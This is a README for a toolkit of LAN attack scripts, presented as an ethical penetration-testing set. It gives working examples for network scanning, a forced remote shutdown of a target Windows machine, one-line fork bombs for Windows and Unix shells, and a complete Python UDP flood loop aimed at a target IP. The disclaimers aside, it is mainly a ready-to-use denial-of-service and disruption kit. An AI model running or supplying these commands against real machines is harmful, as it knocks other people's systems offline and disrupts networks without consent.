# LAN_Toolkit
LAN_Toolkit is a set of scripts ethical penetration testing purposes, specifically tailored to analyze and simulate attacks on machines within a local area network (LAN). These tools are intended for use in controlled environments

🚀 Key Features of LAN_Toolkit:
Network Discovery:

scan_lan.sh: A tool that helps you discover devices connected to your local network. It uses the powerful nmap utility to identify live hosts, their IP addresses, and MAC addresses, as well as some services running on those devices.

Shutdown Target Machine:

shutdown_target.cmd: A Windows-specific script that allows you to forcefully shut down a target machine within the same network. This is achieved using Windows' built-in shutdown command with remote access (\\<target_ip>).

System Freeze (Fork Bomb):

freeze.bat (Windows) and forkbomb.sh (Linux/macOS): These scripts trigger a fork bomb—an infinite loop of processes that causes the system to become unresponsive and effectively freeze. This is an overload attack that consumes all available system resources.

These scripts are powerful, so they should only be run in safe, controlled environments, such as VMs, to prevent any lasting damage.

UDP Flood Attack:

udp_flood.py: A Python script that simulates a UDP flood attack, overwhelming the target machine with an excessive number of UDP packets, potentially causing system slowdown, crash, or network disruptions. This can be useful for testing a machine's resilience to network-based attacks.

User-friendly Documentation:

README.md: A detailed explanation of each tool, how to use them, and a legal disclaimer about responsible use.

commands_reference.txt: This text file offers in-depth explanations of the individual commands and scripts, as well as the proper context for each tool.

⚠️ Legal Disclaimer:
LAN_Toolkit is for educational and ethical penetration testing only. The scripts provided here are meant to simulate attacks in safe, controlled environments, such as virtual labs or personal test systems. Unauthorized use of these tools can lead to legal consequences. You must never use these scripts on a network or system without explicit permission from the owner of the devices.

🌐 Tool Usage Overview:
1. Discover Devices on the LAN:
To identify machines on the same network, you can run the scan_lan.sh script (for Kali Linux/macOS) or use arp -a on Windows. This helps you gather essential information like IP addresses, MAC addresses, and any running services that might be of interest for testing.

Example for Kali/Linux/macOS:

bash
nmap -sn 192.168.1.0/24
2. Shutdown Target Machine:
Once you have identified a machine's IP address, you can remotely shut it down using the shutdown_target.cmd script (Windows only). The script allows you to issue a shutdown command to the target machine, forcing it to power off.

Example for Windows:

cmd
shutdown /s /f /t 0 /m \\192.168.1.5
3. Freeze the System:
Both Windows and Linux/macOS are susceptible to a fork bomb attack, which rapidly consumes system resources, causing the system to become unresponsive. The freeze.bat script works on Windows, while forkbomb.sh works on Linux/macOS.

Example for Windows (Fork Bomb):

bat
%0|%0
Example for Linux/macOS (Fork Bomb):

bash
:(){ :|:& };:
4. UDP Flood Attack:
For a network overload attack, the udp_flood.py script sends a massive number of UDP packets to a target machine, potentially causing it to become slow or crash. This can be useful to test a device’s resilience to high network traffic.

Example for Python UDP Flood:

python
import socket
target = "192.168.1.5"  # IP of the target machine
port = 80               # Port (e.g., HTTP port)
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
data = b"A" * 1024      # Data packet to send
while True:
    sock.sendto(data, (target, port))  # Send the UDP packet
📁 File Structure Overview:
The LAN_Toolkit directory includes the following files:

scan_lan.sh: A bash script for discovering devices in the LAN.

shutdown_target.cmd: A Windows command to shut down a target computer in the network.

freeze.bat: A Windows batch file to execute a fork bomb and freeze the system.

forkbomb.sh: A Linux/macOS script for triggering a fork bomb to freeze the system.

udp_flood.py: A Python script to simulate a UDP flood attack.

README.md: A guide explaining the purpose, usage, and legal notes for each tool.

commands_reference.txt: A reference file with detailed explanations of each command.

🎯 Why Use LAN_Toolkit?
Educational Use: Ideal for learning about network security, penetration testing, and system vulnerabilities in a controlled environment.

Test System Resilience: Helps you assess how well your systems respond to network overloads, shutdown commands, or freeze attacks.

Virtual Lab Setup: Works perfectly for virtualized testing environments (e.g., VMs) to simulate attacks without harming production systems.
